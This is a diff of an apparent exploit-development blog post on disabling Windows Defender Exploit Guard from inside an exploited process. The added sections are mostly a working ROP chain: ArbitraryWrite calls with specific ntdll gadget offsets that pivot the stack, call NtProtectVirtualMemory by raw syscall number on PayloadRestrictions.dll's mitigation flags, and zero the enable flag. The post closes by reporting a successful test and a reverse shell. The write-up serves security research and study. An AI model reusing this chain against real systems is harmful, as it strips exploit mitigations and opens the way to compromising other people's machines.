@@ -146,11 +146,88 @@ There is an easier way, which is less portable. We can set up the registers, mov
 
 ### Making the Syscall
 
-...
+For reference, I have some strings stored at an arbitrary location in the general buffer (look at my previous posts if this does not make sense):
+
+```c
+// PayloadRestrictions.dll
+ArbitraryWrite(generalBufferAddr + 0x520, 0x006c007900610050);              // Payl
+ArbitraryWrite(generalBufferAddr + 0x528, 0x005200640061006f);              // oadR
+ArbitraryWrite(generalBufferAddr + 0x530, 0x0072007400730065);              // estr
+ArbitraryWrite(generalBufferAddr + 0x538, 0x0069007400630069);              // icti
+ArbitraryWrite(generalBufferAddr + 0x540, 0x002e0073006e006f);              // ons.
+ArbitraryWrite(generalBufferAddr + 0x548, 0x006c006c0064);                  // dll
+
+// ...
+
+// NumberOfBytesToProtect in NtProtectVirtualMemory
+ArbitraryWrite(generalBufferAddr + 0x570, 0x200);                          // NumberOfBytesToProtect
+```
+
+Within the original exploit I pivoted the stack to the 'general buffer'. Remember, that WDEG only detects this when a 'critical function' is called.
+
+My first addition is to store the memory location of the flags:
+
+```c
+// store the address of PayloadRestrictions+0xe4000 in the general buffer - offset 0x578
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x9215b); index += 8;         // pop rcx ; ret ;
+ArbitraryWrite(generalBufferAddr + index, generalBufferAddr + 0x578); index += 8;   // general buffer location
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0xecf79); index += 8;         // mov qword[rcx], rax; ret;
+                                                                                    // generalBuffer+0x578 now contains the address of PayloadRestrictions+0xe4000
+    
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x23c93); index += 8;         // pop rax; ret;
+ArbitraryWrite(generalBufferAddr + index, generalBufferAddr + 0x578); index += 8;   // general buffer location
+```
+
+Next we to set up the registers for the `syscall`:
+
+```c
+// set up the registers for the syscall
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x3537a); index += 0x30;      // mov rcx, rax; mov rax, rcx; add rsp, 0x28; ret;
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x76230); index += 8;         // pop r13; ret;
+ArbitraryWrite(generalBufferAddr + index, 0xffffffffffffffff); index += 8;          // ProcessHandle, will go in rcx
+ArbitraryWrite(generalBufferAddr + index, dllBase + 0x11f4); index += 8;            // mov rbx, rcx ; ret ;
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x1948e); index += 8;         // pop r12 ; ret ;
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x1948e); index += 8;         // pop r12 ; ret ;
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x93ccd); index += 8;         // mov rdx, rbx ; mov rcx, r13 ; call r12 ;
+                                                                                    // ProcessHandle in rcx, BaseAddress in rdx
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x20107); index += 8;         // pop r8; ret;
+ArbitraryWrite(generalBufferAddr + index, generalBufferAddr + 0x570); index += 8;   // NumberOfBytesToProtect
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x8fb14); index += 8;         // pop r9; pop r10; pop r11; ret;
+ArbitraryWrite(generalBufferAddr + index, 0x04); index += 8;                        // NewAccessProtection (PAGE_READWRITE)
+ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 8;          // Junk in r10
+ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 8;          // Junk in r11
+```
+
+Next we make the `syscall` to change the protect level on the global mitigation flags:
+
+```c
+// make the syscall
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x21339); index += 8;         // mov rax, rcx; ret;
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x1008e9); index += 0x30;     // mov r10, rax; mov rax, r10; add rsp, 0x28; ret;
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x23c93); index += 8;         // pop rax; ret;
+ArbitraryWrite(generalBufferAddr + index, 0x50); index += 8;                        // 0x50
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x9f672); index += 8;         // syscall; ret
+
+// realign the stack
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x84ab8); index += 38;         // add rsp, 0x20; pop r15; ret;
+```
 
 ### Switch WDEG Off
 
-...
+The final, but all important part, is to change the protect level on the flags:
+
+```c
+// change the WDEG enable flag
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x23c93); index += 8;         // pop rax; ret;
+ArbitraryWrite(generalBufferAddr + index, generalBufferAddr + 0x578); index += 8;   // general buffer location
+                                                                                    // rax now contains the address of PayloadRestrictions+0xe4004
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0xbbbf3); index += 8;         // mov rax, qword[rax]; ret;
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x9215b); index += 8;         // pop rcx ; ret ;
+ArbitraryWrite(generalBufferAddr + index, 0x00); index += 8;                        // 0x00
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0xf49e3); index += 0x30;      // mov qword[rax], rcx; add rsp, 0x28; ret;
+```
+
+If all goes well then we are able to pivot the stack and call 'critical functions' such as `VirtualProtect`:
 
 ## Portability
 
@@ -158,11 +235,21 @@ When we make a `syscall` we must know the number that identifies the `syscall`. 
 
 ## Testing the Exploit
 
-...
+We can test the final exploit outside of WinDbg:
+
+<img width="1109" alt="Screenshot 2025-01-27 at 15 28 33" src="https://github.com/user-attachments/assets/42a59acd-3613-44a6-b6dd-691d7c566a57" style="border: 1px solid black" />
+
+Looks good, but did we get a reverse shell:
+
+<img width="1109" alt="Screenshot 2025-01-27 at 15 28 33" src="https://github.com/user-attachments/assets/fa4cc7be-cd5c-4c67-844b-ea1e2b7f9807" style="border: 1px solid black" />
+
+Nice!
 
 ## Conclusion
 
-...
+This was a nice exercise and I learned a lot about WDEG and how it has flaws. When I was searching online I didn't find a great deal of open source information on it. I might revisit it, time permitting, to see if I can make it more portable. I am more focused on CFG and ACG at the moment.
+
+That is all... go away!
 
 ## References
 
